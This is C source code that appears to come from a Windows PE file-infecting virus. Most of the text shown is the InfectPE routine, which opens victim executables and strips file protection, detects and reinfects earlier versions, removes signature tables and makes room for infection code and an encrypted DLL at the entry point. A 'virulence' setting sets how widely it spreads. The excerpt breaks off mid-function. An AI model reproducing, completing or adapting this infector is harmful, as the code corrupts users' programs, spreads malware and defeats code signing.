
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef dbgdbg

 #define REAL_INFECT   // real infect in debug mode (rename temp.ivr to file.exe)
// #define AV_DETECT   // antiviral mode - detect only (if enabled, cant cure)
// #define AV_CURE     // antiviral mode - save cured to .ivr file
 #define pedbg

#else

 #define REAL_INFECT   // always real infect in non-debug mode

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

#define PEINF_USR_MA 13 
#define PEINF_LNK_MA 8

#define SECTIONS 1        // quantity of sections current
#define LESS6_SECTIONS 4  // quantity of sections for PEINF_VER<6  REINFECT
#define LESS13_SECTIONS 3 // quantity of sections for PEINF_VER<13 REINFECT
#define LESS16_SECTIONS 2 // quantity of sections for PEINF_VER<16 REINFECT
#define LESS17_SECTIONS 1 // quantity of sections for PEINF_VER<17 REINFECT

//---GLOBALS
//@S
BYTE VIRULENCE=0;         // [0;50]    - NIGHTMARE      (infect everything)
                          // [51;100]  - ULTRA-VIOLENCE (only fixed drives - skip removeable, net)
                          // [101;150] - HURT ME PLENTY (only some files on fixed drives)
                          // [151;...] - HACK TERMINAL  (only services)
DWORD szinfcode;
unsigned char *upx_sect; // our 'UPX0' section vadr
unsigned char *dll_mem;   // vadr of dll in memory
DWORD dll_len;            // size of our dll 
DWORD infsize;            // size of C_CODE
char SECTNAME[50];       // our section name, if SECTNAME[0]==0, we use 'UPX0'
//@E

DWORD align(DWORD n,DWORD a)
{
	DWORD r;

	if (/*@S==*/n%a == 0/*@E*/) return n; //@S
	
	r = /*@S+*/(n/a) * a + a/*@E*/;       //@E
 
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		// adddeb("_IN_ n:%X a:%X OUT:%X",n,a,r);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	
	return r;
}

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PEDUMP
void DumpFile(char *fname,char *b,DWORD len)
{
	DWORD qq;
	HANDLE hd = _CreateFile(fname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	_WriteFile(hd, b, len, &qq, NULL);
	_CloseHandle(hd);
}
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

/////////////////////////////////////////////////

DWORD ReinfectSince17(char *fname,unsigned char *b, DWORD len, DWORD org_len, DWORD epOFS, DWORD SECTALIGN, DWORD FILEALIGN)
{
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		adddebf(fname, "### ReinfectSince17 (infver>=17) ");
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//-get exe_szinfcode

	BYTE c0, c1, c2, c3;
	BYTE exe_key;
	DWORD w, i;
	DWORD exe_upxsize1, exe_upxsize2;
	DWORD exe_szinfcode=0;          //@S
	DWORD q0=align(len,FILEALIGN);  //@E // phys. offset of last (our 'UPX0') section begin
	DWORD q=q0;                   //@S 
	DWORD qm=/*@S+*/q0+3072/*@E*/;//@E   // C_CODE should not be bigger size
	if (qm > org_len) qm = org_len;

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname,"### ReinfectSince17  Search encrypted DLL in [0x%X;0x%X]",q0,qm);
  for (DWORD i=q0;i<qm;i+=16) { adddebf(fname,"%.08X %.02X %.02X %.02X %.02X %.02X %.02X %.02X %.02X %.02X %.02X %.02X %.02X %.02X %.02X %.02X %.02X",i,b[i],b[i+1],b[i+2],b[i+3],b[i+4],b[i+5],b[i+6],b[i+7],b[i+8],b[i+9],b[i+10],b[i+11],b[i+12],b[i+13],b[i+14],b[i+15]); }
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 rloop:;
  exe_key = 'M' ^ b[q];

  w = /*@S+*/ q + 0xDA /*@E*/;  // from 'PE' sig

  for (;w</*@S+*/q+0x230/*@E*/;w++)  
  {
     // '.text' section name in PE header

   c0 = b[w] ^ exe_key;              if (/*@S!=*/c0 != '.'/*@E*/) continue; //@S
   c1 = b[/*@S+*/w+1/*@E*/]^exe_key; if (/*@S!=*/c1 != 't'/*@E*/) continue;
   c2 = b[/*@S+*/w+2/*@E*/]^exe_key; if (/*@S!=*/c2 != 'e'/*@E*/) continue;
   c3 = b[/*@S+*/w+3/*@E*/]^exe_key; if (/*@S!=*/c3 != 'x'/*@E*/) continue; //@E

    //compare upx.sect size counted by different ways to be sure

   exe_szinfcode = q-q0;              //@S
   exe_upxsize1 = org_len-q0; //@E
    //exe_upxsize2: v19 align vmesto FILEALIGN nado SECTALIGN
   exe_upxsize2 = align(exe_szinfcode + b[/*@S+*/q+1/*@E*/]*SECTALIGN + b[/*@S+*/q+2/*@E*/]*512,FILEALIGN);

   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
    adddebf(fname,"### ReinfectSince17 ... b[%X]:%c%c%c%c q:%X",w,c0,c1,c2,c3,q);
    adddebf(fname,"### ReinfectSince17 ... exe_upxsize1:0x%X  exe_upxsize2:0x%X (equal==FOUND!)",exe_upxsize1,exe_upxsize2);
   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

   if (exe_upxsize1 != exe_upxsize2) continue;
   
   //encrypted DLL FOUND!

   goto rdone;
  }

  q++;
 if (q<qm) goto rloop;

 rdone:;

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname,"### ReinfectSince17 exe_szinfcode:0x%X (0x0 == encrypted DLL not found) exe_key:0x%02X",exe_szinfcode,exe_key);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if  

 if (/*@S==*/exe_szinfcode==0/*@E*/) return 0;

  //- restore original exe code

 for (i = 0; i < exe_szinfcode; i++) 
	 b[/*@S+*/epOFS + i/*@E*/] = b[/*@S+*/q0 + i/*@E*/];

 return exe_szinfcode;
}

/////////////////////////////////////////////////

BOOL InfectPE(char *fname)
{	
	unsigned char *b;
	unsigned char t[250000]; //@S  // buffer for dll & infcode
	DWORD SECTALIGN;               // exe section alignment
	DWORD FILEALIGN;
	DWORD hop, q;                 //@E
	DWORD peofs, len, org_len;
	DWORD newheadersize;
	PE_HEADER *pe;
	PE_OBJENTRY *obj_e; //@E
	HANDLE h;

	BOOL REINFECT=FALSE; //@S
	DWORD infver;        //@E

	DWORD eiRVA;		 //@S   //exe import RVA
	DWORD epRVA;				//exe entry point RVA
	DWORD eiofs;				//exe import physoffs
	DWORD epOFS;         //@E   //exe entry point physoffset

	DWORD maxrva = 0;      //@S
	DWORD maxphs = 0;
	DWORD dbgofs = 0;
	DWORD odsize;

	DWORD i, IFO;

	DWORD ip1, ip2, abcd;
	BOOL kernok;

	char *td;       
	DWORD peofs_d;  
	PE_HEADER *pe_d;

	DWORD SECTSIZEA;
	BYTE key;

	DWORD dll_offs;
	DWORD xors;

//Number  Name  VirtSize RVA      PhysSize Offset   Flag
//    1  .text  000104A8 00001000 000104A8 00000400 60000020  ; DLL ENTRY POINT
//    2  .bss   0001BE68 00012000 00000000 00000000 C0000080
//    3  .data  00005504 0002E000 00005504 00010A00 C0000040
//    4  .idata 000001E4 00034000 000001E4 00016000 C0000060
//    5  .reloc 00002434 00035000 00002434 00016400 02000020
//    6  .edata 0000004C 00038000 0000004C 00018A00 40000020

 //@S
 PE_OBJENTRY *obj_d; 
 DWORD rel;                // reloc
 DWORD expRVA,expOFS;      // export '.edata' RVA & offset

 DWORD dlltextOFS;         // physoffs of dll '.text' section
 DWORD dlltextPSZ;         // physsize of dll '.text' section
 DWORD dlltextVSZ;         // virtsize of dll '.text' section
 DWORD dlltextRVA;         // virt.RVA of dll '.text' section

 DWORD dlldataOFS;         // physoffs of dll '.data' section
 DWORD dlldataPSZ;         // physsize of dll '.data' section
 DWORD dlldataVSZ;         // virtsize of dll '.data' section
 DWORD dlldataRVA;         // virt.RVA of dll '.data' section
 //@E


	EXPORT_DIRECTORY_TABLE *edt;
	DWORD feofs;

	dMEMORY *dmem;
	DWORD dlbmRVA;

	DWORD dlbmTextOFS;

	DWORD dll_vadr;         
	DWORD reloc_vadr;       
	DWORD new_dll_text_vadr;

	DWORD repl_data[20];                              //@E
	DWORD exe_LibMain_vadr;

	DWORD add;
	DWORD start;
	DWORD jmp_ofs;

	DWORD slen;
	 char nfname[0xFF]; //@E

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	adddebf(fname, "INFECTPE %s", fname);
	adddebf(fname, " dll_mem:0x%X dll_len:0x%X szinfcode:0x%X",dll_mem,dll_len,szinfcode);
	if (dll_len > sizeof(t)) 
	{ adddebf(fname,"\n\n InfectPE !ERROR: dll_mem > sizeof(t)"); exit(1); }
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// copy dll_mem to &t[szinfcode]

	_memcpy(&t[szinfcode],dll_mem,dll_len);       //@S

	// Open victim file
                                     
	hop = 0;                                  //@E

	again:;
	h = _CreateFile(fname, GENERIC_READ | GENERIC_WRITE | FILE_SHARE_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (/*@S==*/h == (HANDLE)0xFFFFFFFF/*@E*/)
	{
		hop++; 
		if (/*@S==*/hop == 1/*@E*/) 
		{ UnprotectFile(fname); goto again; } //NT-chk in func
		return FALSE;
	}

	len = _GetFileSize(h, NULL);
	org_len = len;  //@S     
							    
	b = _LocalAlloc(LMEM_FIXED, /*@S+*/ len + dll_len + 0x2FFFF /*@E*/); //@E
	if (/*@S==*/ b == NULL /*@E*/) goto errexit;
	_ReadFile(h, b , len, &q, NULL);

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	adddebf(fname," ReadFile read:0x%X bytes - should be >= 1024 or exit",q);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	if (q < 1024) goto errexit;

	//- do not infect if dll_len==0  (no kkqvx.dll in exe mode)_

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AV_DETECT  // skip this check in AV_DETECT mode
	goto skip_dllsize_chk;
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AV_CURE    // skip this check in AV_CURE mode
	goto skip_dllsize_chk;
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	if (/*@S==*/ dll_len == 0 /*@E*/)
	{
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		adddebf(fname," dll_len==0, not infected");
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
		goto errexit;
	}

skip_dllsize_chk:;

	//--- check PE

	peofs = ((DWORD*)&b[0x3C])[0]; 

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	adddebf(fname," peofs:%X SZPE:%X q:%X q-SZPE:%X (peofs > q-SZPE == WRONG PE)",peofs,SZPE,q,q-SZPE);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	if (peofs > q-SZPE) goto errexit; // not PE or corrupted

	pe = /*@S+*/b + peofs/*@E*/;
 
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	adddebf(fname," PE->id:%X (4550==OK) / pe->subsystem:%X (1==native,exit) / pe->magic:%X (20B==64bit,exit)\n",(pe->id & 0x0000FFFF),pe->subsystem,pe->magic);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	if ((pe->id & 0x0000FFFF) != 0x4550) goto errexit;  // no 'PE' sig
	if (/*@S==*/pe->subsystem == 1/*@E*/) goto errexit;  //@S // os native
	if (/*@S!=*/pe->magic != 0x10b/*@E*/) goto errexit;  //@E // 0x10b==PE32 0x20b==PE64

	FILEALIGN = pe->filealign;    //@S
	SECTALIGN = pe->objectalign;  //@E
 
	//--- check if already infected

// BOOL REINFECT=FALSE; //@S
// DWORD infver;        //@E

	if (/*@S&&*/(pe->usermajor == PEINF_USR_MA) && (pe->linkmajor = PEINF_LNK_MA)/*@E*/)
	{
		infver = pe->userminor;

		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef dbgdbg
		 adddebf(fname," %s INFECTION DETECTED, file_ver:%u, our_ver:%u",fname,infver,PEINF_VER);
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		//- AV MODE: DETECT OR CURE

		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AV_DETECT 
		 goto real_exit;
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AV_CURE
		 adddebf(fname,"AV_CURE MODE, REINFECT=TRUE");
		 goto reinfect;
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		if (infver>=PEINF_VER)
		{
		 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		  adddebf(fname,"ALREADY INFECTED %s",fname);
		 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
		 goto errexit;
		}

		reinfect:;

		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		 adddebf(fname,"REINFECT %s",fname);
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		REINFECT = TRUE;
	}

	if (/*@S!=*/ REINFECT != 0 /*@E*/)
	{
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		 adddebf(fname,"REINFECT ... BEFORE sect cut ... pe->numofobjects:%u",pe->numofobjects);
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		     if (infver < 6)  pe->numofobjects-=LESS6_SECTIONS;  //4
		else if (infver < 13) pe->numofobjects-=LESS13_SECTIONS; //3
		else if (infver < 16) pe->numofobjects-=LESS16_SECTIONS; //2
		else if (infver < 17) pe->numofobjects-=LESS17_SECTIONS; //1
		else pe->numofobjects = pe->numofobjects - SECTIONS;

	  //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		adddebf(fname,"REINFECT ...  AFTER sect cut ... pe->numofobjects:%u",pe->numofobjects);
	  //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	}

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AV_CURE
	if (!REINFECT) goto errexit;
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//--- get import table & entry point RVA

	eiRVA  = pe->importrva; //@S    //exe import RVA
	epRVA  = pe->entrypointrva;     //exe entry point RVA
	//eiofs;                          //exe import physoffs
	epOFS = 0;              //@E    //exe entry point physoffset

	//--- check imports location: should not be inside C_CODE

	 //imports start after EP, inside our future C_CODE

	if ((eiRVA > epRVA) && (eiRVA < epRVA + szinfcode))
	{
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	  adddebf(fname,"!!! ERROR !!! IMPORTS START (eiRVA:0x%X) AFTER EP (epRVA:0x%X), INSIDE C_CODE",eiRVA,epRVA);
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	 goto errexit;
	}

	 //imports start before EP, but end inside our future C_CODE

	if ((eiRVA < epRVA) && (eiRVA+pe->importsize > epRVA))
	{
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	  adddebf(fname,"!!! ERROR !!! IMPORTS START (eiRVA:0x%X) BEFORE EP (epRVA:0x%X), BUT END INSIDE C_CODE",eiRVA,epRVA);
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	 goto errexit;
	}

	//--- object table

	newheadersize = /*@S+*/peofs + SZPE + pe->boundimpsize/*@E*/; 
	newheadersize += (/*@S**/pe->numofobjects * SZOBJE/*@E*/);        //@S
	newheadersize += (/*@S**/SZOBJE * SECTIONS/*@E*/);                //@E

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	 adddebf(fname,"pe->numofobjects:0x%X * SZOBJE = 0x%X",pe->numofobjects,pe->numofobjects*SZOBJE);
	 adddebf(fname,"pe->boundimpsize:0x%X",pe->boundimpsize);
	 adddebf(fname," SZOBJE*SECTIONS:0x%X",SZOBJE*SECTIONS);
	 adddebf(fname,"  pe->headersize:0x%X vs newheadersize:0x%X",pe->headersize,newheadersize);
	 adddebf(fname," pe->objectalign:0x%X (aka section alignment)",SECTALIGN);
	 adddebf(fname,"---");
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// out of objects & bound import check
	if (newheadersize > pe->headersize)
	{
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	  adddebf(fname,"out of objects & bound import check failed");
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	 goto errexit;
	}

	//--- cycle through victim .EXE sections

	cycle:;

	maxrva = 0;     //@S
	maxphs = 0;
	dbgofs = 0;

	 //--- now main cycle through sections

	for (q = 0; q < pe->numofobjects; q++)
	{
		DWORD rva;
		DWORD phs;

		obj_e = /*@S+*/b + peofs + SZPE + SZOBJE * q/*@E*/;

		rva = /*@S+*/obj_e->virtrva  + obj_e->virtsize/*@E*/; //@S
		phs = /*@S+*/obj_e->physoffs + obj_e->physsize/*@E*/; //@E
		if (rva > maxrva) maxrva = rva; //@S
		if (phs > maxphs) maxphs = phs; //@E

		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		 adddebf(fname,"EXE %s\tpofs:0x%X\tpsize:0x%X\tvsize:0x%X\tibase+rva:0x%X",obj_e->name,obj_e->physoffs,obj_e->physsize,obj_e->virtsize,pe->imagebase + obj_e->virtrva);
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		if (/*@S&&*/(pe->debugrva >= obj_e->virtrva) && (pe->debugrva < rva)/*@E*/) 
		{
			dbgofs = /*@S+*/obj_e->physoffs + pe->debugrva/*@E*/ - obj_e->virtrva;
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
			 adddebf(fname," -debug table in this section  (dbgofs:0x%X = obj_e->physoffs + pe->debugrva)",dbgofs);
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
		}

		if (/*@S&&*/(eiRVA >= obj_e->virtrva)&&(eiRVA < obj_e->virtrva+obj_e->virtsize)/*@E*/)
		{
			eiofs = /*@S+*/(eiRVA - obj_e->virtrva) + obj_e->physoffs/*@E*/;
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
			 adddebf(fname," -import table in this section (eiRVA:0x%X eiofs:0x%X) pe->importsize:0x%X",eiRVA,eiofs,pe->importsize);
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
		}

		if (/*@S&&*/(epRVA >= obj_e->virtrva)&&(epRVA < obj_e->virtrva+obj_e->virtsize)/*@E*/)
		{
			DWORD ep_sect_ofs, space;
			//obj_e->objectflags|=0x80000000; // set "Write" permission on section - obsolete, use VirtualProtect

			epOFS = /*@S+*/(epRVA-obj_e->virtrva) + obj_e->physoffs/*@E*/;
			
			//--- check is space from EP to section_end enough for C_CODE?

			ep_sect_ofs = epRVA - obj_e->virtrva;  // EP offset inside section
			space = obj_e->physsize - ep_sect_ofs; // free space

			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
			 adddebf(fname," -entry point in this section  (epRVA:%X epOFS:%X)",epRVA,epOFS);
			 adddebf(fname," -free space in section:0x%X szinfcode:0x%X (szinfcode > space == exit)",space,szinfcode);
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

			if (szinfcode > space) goto errexit;
		}
	} // for

	// --- check debug table size

	odsize = 0; // size of debugs stored as overlay (after all sections)

	if (dbgofs != 0)
	{
		PE_DEBUG *dt;  //@S
		DWORD dseek=0; //@E // max phys offset of debug info

		for (q = 0; q < pe->debugsize / SZDBG; q++)
		{
			dt = &b[/*@S+*/dbgofs + q * SZDBG/*@E*/];

			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
			 adddebf(fname,"\nexe %u debug table DataSeek:0x%X",q,dt->DataSeek);
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if  

			if (dt->DataSeek > dseek)   dseek = dt->DataSeek;
			if (dt->DataSeek >= maxphs) odsize += dt->DataSize; 
		}

		// --- OVERLAY check

		dseek = align(dseek, FILEALIGN); 

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	  adddebf(fname,"exe    len: 0x%X", len);
	  adddebf(fname,"exe maxphs: 0x%X", maxphs);
	  adddebf(fname,"exe  dseek: 0x%X (now aligned by FILEALIGN)", dseek);
	  adddebf(fname,"exe pe->securityrva: 0x%X   pe->securitysize:0x%X", pe->securityrva, pe->securitysize);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	 
	if (/*@S&&*/(REINFECT == 0) && (maxphs != len)/*@E*/)  // OVERLAY!
	{
		DWORD ovsize = len-maxphs; // overlay size

		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		 adddebf(fname,"exe maxphs != len && REINFECT==0  !!!  OVERLAY DETECTED at 0x%X size:0x%X",maxphs,ovsize);
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		if (/*@S!=*/dseek == maxphs/*@E*/) // this overlay is debug table, all ok
		{
		 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		  adddebf(fname,"exe dseek == maxphs !!! ALL OK, our overlay is debug table");
		 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
		 goto all_ok; 
		}
	
		if (/*@S&&*/(maxphs==pe->securityrva)&&(ovsize==pe->securitysize)/*@E*/) // ALL OK, overlay is security table (exe sign here in iexplore.exe win7)
		{
		 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		  adddebf(fname,"exe maxphs == pe->securityrva !!! ALL OK, our overlay is security table, CUT IT: len=maxphs");
		 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
		 len=maxphs;           //@S // cut security table
		 pe->securityrva  = 0;
		 pe->securitysize = 0; //@E
		 goto all_ok; 
		}

		goto errexit;
		all_ok:;
	}
	}

	//-

	if (/*@S!=*/REINFECT!=0/*@E*/) len=maxphs+odsize; //cut our sections

	//- 

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PEDUMP
	 DumpFile("dump.000",b,len); // dump000 of restored file
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//-

	maxrva = align(maxrva, SECTALIGN);

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	 if (REINFECT!=0) adddebf(fname,"exe    len:0x%X",len);
	 adddebf(fname,"exe dbgofs:0x%X (debug table phys.offset)",dbgofs); 
	 adddebf(fname,"exe odsize:0x%X (size of all debugs in overlay zone)",odsize);
	 adddebf(fname,"exe maxrva:0x%X (aligned by SECTALIGN:0x%X)",maxrva,SECTALIGN);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//--- overlay & no dbg section

	if (/*@S&&*/(len != maxphs) && (pe->debugrva == 0)/*@E*/) 
	{
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	  adddebf(fname,"EXIT: OVERLAY & NO DEBUG DIRECTORY!");
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	 goto errexit; 
	}

	//--- old reinfect: ver<17

	if ( (/*@S!=*/REINFECT != 0/*@E*/) && (infver < 17) && (epOFS == 0) )
	{
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	  adddebf(fname,"###");
	  adddebf(fname,"### OLD_REINFECT (infver<17) ");
	  adddebf(fname,"###");
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	  //find eip of jmp xxxxxxxx

	 IFO = align(len,FILEALIGN);
	                                                                 
	 for (i = 7; i < 50; i++) if (b[IFO+i]==0xE9) break; // 7 == PUSHAD+CALL_ZZXXCCVV+POPAD

	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	  adddebf(fname,"### REINFECT_EntryP_RESTORE i (jmp relative offset from IFO): 0x%X (0x32 == ERROR!!!)",i);
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	 if (i == 50) goto errexit;

	 abcd = ((DWORD*)(&b[/*@S+*/IFO+i+1/*@E*/]))[0];  // get jmp's XXXXXXXX         
	 ip1 = /*@S+*/pe->imagebase + pe->entrypointrva + i/*@E*/; // jmp EIP                                                      
	 ip2 = /*@S+*/(abcd-0xFFFFFFFF) + ip1 + 4/*@E*/;  // restored EP

	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	  adddebf(fname,"### REINFECT_EntryP_RESTORE IFO (infcode offset in b): %X",IFO);
	  adddebf(fname,"### REINFECT_EntryP_RESTORE vir_entrypoint: %X",pe->imagebase+pe->entrypointrva);
	  adddebf(fname,"### REINFECT_EntryP_RESTORE ip1(jmp is here): %X abcd:%.8X",ip1,abcd);
	  adddebf(fname,"### REINFECT_EntryP_RESTORE ip2(restored EP): %X",ip2);
	  adddebf(fname,"###");
	  adddebf(fname,"### AGAIN LOOP THROUGH EXE SECTIONS to get epOFS");
	  adddebf(fname,"###");
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	 pe->entrypointrva = ip2-pe->imagebase; //@S
	 epRVA = ip2-pe->imagebase;             //@E

	 //- cure mode 

	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AV_CURE
	  pe->imagesize=align(maxrva,SECTALIGN); 
